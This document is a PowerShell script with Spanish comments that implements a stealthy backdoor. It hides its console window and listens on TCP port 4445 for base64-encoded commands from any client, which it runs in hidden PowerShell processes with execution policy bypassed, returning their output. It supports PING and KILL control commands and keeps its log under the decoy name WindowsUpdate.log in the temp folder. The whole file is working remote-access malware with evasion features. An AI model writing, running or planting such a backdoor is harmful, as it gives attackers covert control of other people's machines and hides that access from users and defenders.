param(
    [string]$ListenerIP = "0.0.0.0",
    [int]$Port = 4445
)

# Ocultar ventana de PowerShell
Add-Type -Name Window -Namespace Console -MemberDefinition '
[DllImport("Kernel32.dll")]
public static extern IntPtr GetConsoleWindow();
[DllImport("user32.dll")]
public static extern bool ShowWindow(IntPtr hWnd, Int32 nCmdShow);
'
$consolePtr = [Console.Window]::GetConsoleWindow()
[Console.Window]::ShowWindow($consolePtr, 0)  # 0 = hide

# Función para ejecutar comandos de forma silenciosa
function Invoke-StealthCommand {
    param([string]$Command)
    
    try {
        # Crear proceso oculto
        $processStartInfo = New-Object System.Diagnostics.ProcessStartInfo
        $processStartInfo.FileName = "powershell.exe"
        $processStartInfo.Arguments = "-NoProfile -ExecutionPolicy Bypass -Command `"$Command`""
        $processStartInfo.RedirectStandardOutput = $true
        $processStartInfo.RedirectStandardError = $true
        $processStartInfo.UseShellExecute = $false
        $processStartInfo.CreateNoWindow = $true
        $processStartInfo.WindowStyle = [System.Diagnostics.ProcessWindowStyle]::Hidden
        
        $process = New-Object System.Diagnostics.Process
        $process.StartInfo = $processStartInfo
        $process.Start() | Out-Null
        $output = $process.StandardOutput.ReadToEnd()
        $process.WaitForExit()
        
        return $output
    }
    catch {
        return "Error: $($_.Exception.Message)"
    }
}

# Función listener mejorada
function Start-StealthListener {
    param([string]$IP, [int]$Port)
    
    try {
        $listener = [System.Net.Sockets.TcpListener]::new($IP, $Port)
        $listener.Start()
        
        # Registrar en log oculto
        $logPath = "$env:TEMP\WindowsUpdate.log"
        "Listener started on $IP`:$Port $(Get-Date)" | Out-File $logPath -Append
        
        while($true) {
            $client = $listener.AcceptTcpClient()
            $stream = $client.GetStream()
            $reader = New-Object System.IO.StreamReader($stream)
            $writer = New-Object System.IO.StreamWriter($stream)
            $writer.AutoFlush = $true
            
            $rawCommand = $reader.ReadLine()
            
            if($rawCommand -eq "PING") {
                # Comando de verificación de conexión
                $writer.WriteLine("ALIVE")
            }
            elseif($rawCommand -match "powershell -EncodedCommand (.+)") {
                $encodedCommand = $matches[1]
                $decodedCommand = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($encodedCommand))
                
                # Log del comando recibido
                "Command received: $decodedCommand $(Get-Date)" | Out-File $logPath -Append
                
                # Ejecutar de forma stealth
                $output = Invoke-StealthCommand -Command $decodedCommand
                $writer.WriteLine($output)
                
                # Log de ejecución
                "Command executed successfully $(Get-Date)" | Out-File $logPath -Append
            }
            elseif($rawCommand -eq "KILL") {
                # Comando para auto-destrucción
                $writer.WriteLine("SHUTTING DOWN")
                break
            }
            
            $reader.Close()
            $writer.Close()
            $client.Close()
        }
    }
    catch {
        $errorMsg = $_.Exception.Message
        $errorMsg | Out-File $logPath -Append
    }
    finally {
        if($listener) { 
            $listener.Stop() 
            "Listener stopped $(Get-Date)" | Out-File $logPath -Append
        }
    }
}

# Iniciar de forma completamente oculta
Start-StealthListener -IP $ListenerIP -Port $Port
